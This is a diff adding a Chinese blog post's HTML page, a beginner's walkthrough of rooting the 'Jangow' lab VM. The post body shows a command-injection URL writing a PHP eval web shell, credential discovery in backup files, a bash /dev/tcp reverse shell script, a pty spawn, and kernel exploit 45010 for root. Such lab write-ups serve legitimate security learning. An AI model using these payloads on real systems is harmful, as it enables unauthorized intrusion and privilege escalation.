@@ -1,0 +1,83 @@
+<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="format-detection" content="telephone=no"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black"><link rel="icon" href="/images/icons/favicon-16x16.png?v=2.8.0" type="image/png" sizes="16x16"><link rel="icon" href="/images/icons/favicon-32x32.png?v=2.8.0" type="image/png" sizes="32x32"><meta name="description" content="第一次做靶机渗透（很好玩，下次还来） 先用virtual box打开靶机   然后获取了ip，开始渗透测试！ 先用kali中的nmap扫一下该ip的端口  发现开了两个端口21的ftp和80的http 先去看80服务然后发现有一个任意命令执行漏洞  然后开写一句话木马（靶机渗透是不是都去写一句话木马啊)感觉靶机都是RCE http:&#x2F;&#x2F;192.168.56.118&#x2F;site&#x2F;busque.php?">
+<meta property="og:type" content="article">
+<meta property="og:title" content="My New Post">
+<meta property="og:url" content="http://example.com/2023/12/21/jangow/index.html">
+<meta property="og:site_name" content="cyny666&#39;s world">
+<meta property="og:description" content="第一次做靶机渗透（很好玩，下次还来） 先用virtual box打开靶机   然后获取了ip，开始渗透测试！ 先用kali中的nmap扫一下该ip的端口  发现开了两个端口21的ftp和80的http 先去看80服务然后发现有一个任意命令执行漏洞  然后开写一句话木马（靶机渗透是不是都去写一句话木马啊)感觉靶机都是RCE http:&#x2F;&#x2F;192.168.56.118&#x2F;site&#x2F;busque.php?">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/assets/image-20231204163322628.png">
+<meta property="og:image" content="http://example.com/assets/image-20231204163337702.png">
+<meta property="og:image" content="http://example.com/assets/image-20231204163437532.png">
+<meta property="og:image" content="http://example.com/assets/image-20231204163911055.png">
+<meta property="og:image" content="http://example.com/assets/image-20231204164023069.png">
+<meta property="og:image" content="http://example.com/assets/image-20231204164328956.png">
+<meta property="og:image" content="http://example.com/assets/image-20231204165735652.png">
+<meta property="og:image" content="http://example.com/assets/image-20231204165932119.png">
+<meta property="article:published_time" content="2023-12-21T07:52:25.000Z">
+<meta property="article:modified_time" content="2023-12-21T08:13:19.886Z">
+<meta property="article:author" content="cyny666">
+<meta property="article:tag" content="Web">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/assets/image-20231204163322628.png"><title>My New Post | cyny666's world</title><link ref="canonical" href="http://example.com/2023/12/21/jangow/"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.12.1/css/all.min.css" type="text/css"><link rel="stylesheet" href="/css/index.css?v=2.8.0"><link rel="stylesheet" href="css/custom.css"><script>var Stun = window.Stun || {};
+var CONFIG = {
+  root: '/',
+  algolia: undefined,
+  assistSearch: undefined,
+  fontIcon: {"prompt":{"success":"fas fa-check-circle","info":"fas fa-arrow-circle-right","warning":"fas fa-exclamation-circle","error":"fas fa-times-circle"},"copyBtn":"fas fa-copy"},
+  sidebar: {"offsetTop":"20px","tocMaxDepth":6},
+  header: {"enable":true,"showOnPost":true,"scrollDownIcon":false},
+  postWidget: {"endText":true},
+  nightMode: {"enable":true},
+  back2top: {"enable":true},
+  codeblock: {"style":"default","highlight":"light","wordWrap":false},
+  reward: false,
+  fancybox: false,
+  zoomImage: {"gapAside":"20px"},
+  galleryWaterfall: undefined,
+  lazyload: false,
+  pjax: undefined,
+  externalLink: {"icon":{"enable":true,"name":"fas fa-external-link-alt"}},
+  shortcuts: undefined,
+  prompt: {"copyButton":"复制","copySuccess":"复制成功","copyError":"复制失败"},
+  sourcePath: {"js":"js","css":"css","images":"images"},
+};
+
+window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 6.3.0"></head><body><div class="container" id="container"><header class="header" id="header"><div class="header-inner"><nav class="header-nav header-nav--fixed"><div class="header-nav-inner"><div class="header-nav-menubtn"><i class="fas fa-bars"></i></div><div class="header-nav-menu"><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/"><span class="header-nav-menu-item__icon"><i class="fas fa-home"></i></span><span class="header-nav-menu-item__text">首页</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/archives/"><span class="header-nav-menu-item__icon"><i class="fas fa-folder-open"></i></span><span class="header-nav-menu-item__text">归档</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/categories/"><span class="header-nav-menu-item__icon"><i class="fas fa-layer-group"></i></span><span class="header-nav-menu-item__text">分类</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/tags/"><span class="header-nav-menu-item__icon"><i class="fas fa-tags"></i></span><span class="header-nav-menu-item__text">标签</span></a></div></div><div class="header-nav-mode"><div class="mode"><div class="mode-track"><span class="mode-track-moon"></span><span class="mode-track-sun"></span></div><div class="mode-thumb"></div></div></div></div></nav><div class="header-banner"><div class="header-banner-info"><div class="header-banner-info__title">Welcome to cyny666's world</div><div class="header-banner-info__subtitle">A world with code and failure</div></div></div></div></header><main class="main" id="main"><div class="main-inner"><div class="content-wrap" id="content-wrap"><div class="content" id="content"><!-- Just used to judge whether it is an article page--><div id="is-post"></div><div class="post"><header class="post-header"><h1 class="post-title">My New Post</h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">发表于</span><span class="post-meta-item__value">2023-12-21</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">更新于</span><span class="post-meta-item__value">2023-12-21</span></span></div></header><div class="post-body"><p>第一次做靶机渗透（很好玩，下次还来）</p>
+<p>先用virtual box打开靶机 </p>
+<p><img src="/./assets/image-20231204163322628.png" alt="image-20231204163322628"></p>
+<p>然后获取了ip，开始渗透测试！</p>
+<p>先用kali中的nmap扫一下该ip的端口</p>
+<p><img src="/./assets/image-20231204163337702.png" alt="image-20231204163337702"></p>
+<p>发现开了两个端口21的ftp和80的http</p>
+<p>先去看80服务然后发现有一个任意命令执行漏洞</p>
+<p><img src="/./assets/image-20231204163437532.png" alt="image-20231204163437532"></p>
+<p>然后开写一句话木马（靶机渗透是不是都去写一句话木马啊)感觉靶机都是RCE</p>
+<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="http://192.168.56.118/site/busque.php?buscar=echo" >http://192.168.56.118/site/busque.php?buscar=echo</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> ‘&lt;?php eval($_POST[“shell”]);’ &gt; shell.php</p>
+<p>然后即可用蚁剑连接获取权限</p>
+<p><img src="/./assets/image-20231204163911055.png" alt="image-20231204163911055"></p>
+<p>然后在里面开始信息收集</p>
+<p>可以在桌面发现user.txt里面有第一个flag</p>
+<p>先在WordPress里面找到config.php</p>
+<p><img src="/./assets/image-20231204164023069.png" alt="image-20231204164023069"></p>
+<p>又找到一个.backup文件然后发现账号密码</p>
+<p><img src="/./assets/image-20231204164328956.png" alt="image-20231204164328956"></p>
+<p>可以用ftp连接（这里有一点信息泄露）</p>
+<p>然后反弹shell</p>
+<p>上传j.sh</p>
+<figure class="highlight sh"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.56.1/443 0&gt;&amp;1</span><br></pre></td></tr></table></div></figure>
+
+<p>用蚁剑执行bash j.sh</p>
+<p>这里用window的nc -lvvp 443了，貌似需要一个内网下的反弹才可以</p>
+<p>然后</p>
+<p><img src="/./assets/image-20231204165735652.png" alt="image-20231204165735652"></p>
+<p>然后发现这个版本为uname -a Ubuntu4.4.0-31</p>
+<p>然后kali上searchsploit ubuntu 4.4.0-31</p>
+<p><img src="/./assets/image-20231204165932119.png" alt="image-20231204165932119"></p>
+<p>然后下载下来searchsploit -m 45010</p>
+<p>然后上传到蚁剑</p>
+<p>windows那边然后先打开一个模拟终端</p>
+<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -c <span class="string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br></pre></td></tr></table></div></figure>
+
+<p>然后编译45010.c即可获取root权限</p>
+<p>至此提权完成</p>
+</div><footer class="post-footer"><div class="post-ending ending"><div class="ending__text">------ 本文结束，感谢您的阅读 ------</div></div><div class="post-copyright copyright"><div class="copyright-author"><span class="copyright-author__name">本文作者: </span><span class="copyright-author__value"><a href="http://example.com">cyny666</a></span></div><div class="copyright-link"><span class="copyright-link__name">本文链接: </span><span class="copyright-link__value"><a href="http://example.com/2023/12/21/jangow/">http://example.com/2023/12/21/jangow/</a></span></div><div class="copyright-notice"><span class="copyright-notice__name">版权声明: </span><span class="copyright-notice__value">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" rel="external nofollow" target="_blank">BY-NC-SA</a> 许可协议。转载请注明出处！</span></div></div><div class="post-tags"><span class="post-tags-item"><span class="post-tags-item__icon"><i class="fas fa-tag"></i></span><a class="post-tags-item__link" href="http://example.com/tags/Web/">Web</a></span></div><nav class="post-paginator paginator"></nav></footer></div></div></div><div class="sidebar-wrap" id="sidebar-wrap"><aside class="sidebar" id="sidebar"><div class="sidebar-nav"><span class="sidebar-nav-toc current">文章目录</span><span class="sidebar-nav-ov">站点概览</span></div><section class="sidebar-toc"></section><!-- ov = overview--><section class="sidebar-ov hide"><div class="sidebar-ov-author"><div class="sidebar-ov-author__avatar"><img class="sidebar-ov-author__avatar_img" src="/images/icons/obj.jpg" alt="avatar"></div><p class="sidebar-ov-author__text">cyny666</p></div><div class="sidebar-ov-state"><a class="sidebar-ov-state-item sidebar-ov-state-item--posts" href="/archives/"><div class="sidebar-ov-state-item__count">1</div><div class="sidebar-ov-state-item__name">归档</div></a><a class="sidebar-ov-state-item sidebar-ov-state-item--categories" href="/categories/"><div class="sidebar-ov-state-item__count">1</div><div class="sidebar-ov-state-item__name">分类</div></a><a class="sidebar-ov-state-item sidebar-ov-state-item--tags" href="/tags/"><div class="sidebar-ov-state-item__count">1</div><div class="sidebar-ov-state-item__name">标签</div></a></div><div class="sidebar-ov-cc"><a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" target="_blank" rel="noopener" data-popover="知识共享许可协议" data-popover-pos="up"><img src="/images/cc-by-nc-sa.svg"></a></div></section><div class="sidebar-reading"><div class="sidebar-reading-info"><span class="sidebar-reading-info__text">你已阅读了 </span><span class="sidebar-reading-info__num">0</span><span class="sidebar-reading-info__perc">%</span></div><div class="sidebar-reading-line"></div></div></aside></div><div class="clearfix"></div></div></main><footer class="footer" id="footer"><div class="footer-inner"><div><span>Copyright © 2023</span><span class="footer__icon"><i class="fas fa-heart"></i></span><span>cyny666</span></div><div><span>由 <a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a> 强力驱动</span><span> v6.3.0</span><span class="footer__devider">|</span><span>主题 - <a href="https://github.com/liuyib/hexo-theme-stun/" title="Stun" target="_blank" rel="noopener">Stun</a></span><span> v2.8.0</span></div></div></footer><div class="loading-bar" id="loading-bar"><div class="loading-bar__progress"></div></div><div class="back2top" id="back2top"><span class="back2top__icon"><i class="fas fa-rocket"></i></span></div></div><script src="https://cdn.jsdelivr.net/npm/jquery@v3.4.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.ui.min.js"></script><script src="/js/utils.js?v=2.8.0"></script><script src="/js/stun-boot.js?v=2.8.0"></script><script src="/js/scroll.js?v=2.8.0"></script><script src="/js/header.js?v=2.8.0"></script><script src="/js/sidebar.js?v=2.8.0"></script></body></html>
